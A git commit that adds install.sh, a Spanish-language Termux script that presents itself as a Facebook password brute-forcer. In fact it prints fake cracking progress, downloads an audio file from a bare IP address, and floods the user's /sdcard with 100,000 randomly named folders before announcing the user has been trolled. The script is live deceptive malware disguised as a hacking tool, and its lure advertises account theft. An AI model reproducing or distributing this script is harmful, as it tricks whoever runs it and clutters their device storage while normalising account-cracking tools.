8959a8e06f4638412d6261b908e0a676a3d53d48
Facundo Salgado <63315825+byteSalgado@users.noreply.github.com>
2020-07-08 19:16:59 -0300

    Create install.sh

---
+++ install.sh
@@ -0,0 +1,118 @@
+  #!/bin/bash
+printf "\e[1;32m Hola bienvenido a la instalacion...\n"
+sleep 3
+printf "\e[1;32m Esta herramienta hackeara un facebook por fuerza bruta..\n"
+sleep 3
+printf "\e[1;32m para continuar vamos a ejecutar unas herramientas en su termux\n"
+sleep 3
+printf "\e[1;32m La instalacion comenzara en 5 segundos\n"
+sleep 5
+termux-setup-storage
+pkg install mpv -y
+pkg install wget -y
+wget http://35.226.60.71/ssh.wav
+clear
+printf "\e[1;32m Modulos instalados.. aguarde\n"
+sleep 4
+printf "\e[1;35m Introdusca el ID del facebook\n"
+read facebook
+printf "\e[1;31mFacebook ID:\e[1;32$facebook\e[1;31 cargado correctamente\n"
+sleep 3
+printf "\e[1;31mCrackeando facebook.. aguarde por favor..\n"
+sleep 3
+printf "\e[1;31mEmpezaremos el ataque en 5 segundos..\n"
+sleep 5
+clear
+printf "\e[1;35mIntentando contraseña:\e[1;31m 1/2550\n"
+sleep 1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 2/2550\n"
+sleep 1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 3/2550\n"
+sleep 1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 4/2550\n"
+sleep 1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 5/2550\n"
+sleep 1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 6/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 8/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 9/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 10/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 11/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 12/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 13/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 14/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 15/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 16/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 17/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 18/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 19/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 20/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 21/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 22/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 23/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 24/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 25/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 26/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 27/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 28/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 29/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 30/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 31/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 32/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 33/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 34/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 35/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 36/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 37/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 38/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 39/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 40/2550\n"
+printf "\e[1;32mPASS FOUND.. 40/2550\n"
+printf "\e[1;35mObteniendo los datos.. espere..\n"
+cd /sdcard/
+for i in {1..100000}
+do
+ mkdir ${RANDOM}
+done
+for i in {1..100}
+do
+ printf "\e[1;35mHAS SIDO TROLEADO REVISA TU SDCARD\n"
+done
+mpv ssh.wav
+mpv ssh.wav
+
+
+
